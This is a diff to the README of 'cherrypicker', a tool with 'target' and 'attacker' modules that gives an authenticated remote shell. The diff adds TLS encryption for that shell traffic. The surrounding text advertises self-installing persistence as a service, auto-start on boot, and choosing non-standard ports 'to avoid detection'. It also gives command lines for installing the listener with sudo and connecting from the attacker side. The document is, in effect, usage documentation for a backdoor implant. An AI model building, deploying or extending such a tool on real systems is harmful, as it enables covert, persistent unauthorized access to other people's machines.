@@ -118,6 +118,9 @@ If authentication succeeds, you'll get an interactive shell on the target.
 | `-p` | - | ✅ | Port to listen on |
 | `-s` | - | ✅ | Authentication signature/key (min 10 chars) |
 | `-install` | false | ❌ | Install as persistent service/daemon (requires root/admin) |
+| `-tls` | true | ❌ | Enable TLS encryption (recommended) |
+| `-cert` | - | ❌ | Path to TLS certificate file (optional, auto-generates if not provided) |
+| `-key` | - | ❌ | Path to TLS private key file (optional, auto-generates if not provided) |
 
 ### Attacker Module
 | Flag | Default | Required | Description |
@@ -126,6 +129,8 @@ If authentication succeeds, you'll get an interactive shell on the target.
 | `-p` | - | ✅ | Target port number |
 | `-s` | - | ✅ | Authentication signature/key (must match target) |
 | `-timeout` | 10 | ❌ | Connection timeout in seconds |
+| `-tls` | true | ❌ | Use TLS encryption (must match target) |
+| `-insecure` | true | ❌ | Skip TLS certificate verification (for self-signed certs) |
 
 ## Architecture
 
@@ -149,8 +154,9 @@ If authentication succeeds, you'll get an interactive shell on the target.
 └─────────────────┘                    └──────────────────┘
 ```
 
-## Authentication
+## Authentication & Encryption
 
+### Authentication
 Uses **SHA256 challenge-response** to prevent unauthorized access:
 
 1. Target generates random challenge (16 bytes hex)
@@ -162,9 +168,46 @@ Uses **SHA256 challenge-response** to prevent unauthorized access:
 
 **Both sides must use the exact same authentication key.**
 
+### Transport Encryption (TLS)
+All traffic is encrypted using **TLS 1.2+** by default:
+
+- **Self-signed certificates**: Auto-generated on target startup (2048-bit RSA)
+- **User-provided certificates**: Use `-cert` and `-key` flags for custom certs
+- **Cipher suites**: Modern ECDHE+AES-GCM ciphers only
+- **Certificate validation**: Disabled by default on attacker (use `-insecure=false` for strict validation)
+
+**TLS protects:**
+- ✅ Authentication handshake
+- ✅ Shell commands sent to target
+- ✅ Command output returned to attacker
+- ✅ All session data
+
+**Using TLS:**
+```bash
+# Target with auto-generated cert (default)
+./cherrypicker-target -p 8888 -s "YourKey"
+
+# Target with custom certificate
+./cherrypicker-target -p 8888 -s "YourKey" -cert server.crt -key server.key
+
+# Disable TLS (not recommended)
+./cherrypicker-target -p 8888 -s "YourKey" -tls=false
+
+# Attacker (default matches target TLS settings)
+./cherrypicker-attacker -t 192.168.1.50 -p 8888 -s "YourKey"
+
+# Attacker with strict cert verification
+./cherrypicker-attacker -t 192.168.1.50 -p 8888 -s "YourKey" -insecure=false
+
+# Attacker without TLS (if target has -tls=false)
+./cherrypicker-attacker -t 192.168.1.50 -p 8888 -s "YourKey" -tls=false
+```
+
 ## Features
 
 - ✅ Challenge-response authentication (SHA256)
+- ✅ **TLS 1.2+ encryption** - All traffic encrypted by default
+- ✅ **Self-signed certificates** - Auto-generated ephemeral certs
 - ✅ Cross-platform (Linux, macOS, Windows)
 - ✅ **Self-installing persistence** - One command to install as service/daemon
 - ✅ **Auto-start on boot** - Survives reboots automatically
@@ -186,8 +229,16 @@ Uses **SHA256 challenge-response** to prevent unauthorized access:
 - Target listens on all interfaces (0.0.0.0) - consider firewall rules
 - Use non-standard ports to avoid detection
 - Monitor connection attempts
-- No encryption on shell traffic - use over trusted networks only
-- Consider SSH tunneling for additional security
+- **TLS encryption enabled by default** - All traffic encrypted with modern ciphers
+- Self-signed certificates auto-generated (2048-bit RSA)
+- Use custom certificates for production deployments
+- Consider SSH tunneling for defense-in-depth
+
+**Certificate Security:**
+- Self-signed certs are ephemeral (generated each run unless using `-cert`/`-key`)
+- Attacker uses `-insecure=true` by default (accepts any cert) for ease of use
+- Use `-insecure=false` for production to enforce certificate validation
+- Custom certificates recommended for enterprise deployments
 
 ## Example Usage Scenarios
 
@@ -213,17 +264,29 @@ sudo ./cherrypicker-target -install -p 31337 -s "Xk9m#pL2$vN8@qR5"
 
 **Secure deployment with custom signature:**
 ```bash
-# On target
+# On target with TLS (default)
 ./cherrypicker-target -p 31337 -s "Xk9m#pL2$vN8@qR5"
 
 # On attacker
 ./cherrypicker-attacker -t 192.168.1.50 -p 31337 -s "Xk9m#pL2$vN8@qR5"
 ```
 
+**Enterprise deployment with custom certificates:**
+```bash
+# Generate your own certificate
+openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes
+
+# On target with custom cert
+./cherrypicker-target -p 8443 -s "YourEnterpriseKey" -cert server.crt -key server.key
+
+# On attacker with strict cert verification
+./cherrypicker-attacker -t 192.168.1.50 -p 8443 -s "YourEnterpriseKey" -insecure=false
+```
+
 **IPv6 support:**
 ```bash
-./cherrypicker-attacker -t 2001:db8::1 -p 9999
-./cherrypicker-attacker -t fe80::1 -p 9999
+./cherrypicker-attacker -t 2001:db8::1 -p 9999 -s "YourKey"
+./cherrypicker-attacker -t fe80::1 -p 9999 -s "YourKey"
 ```
 
 ## Troubleshooting
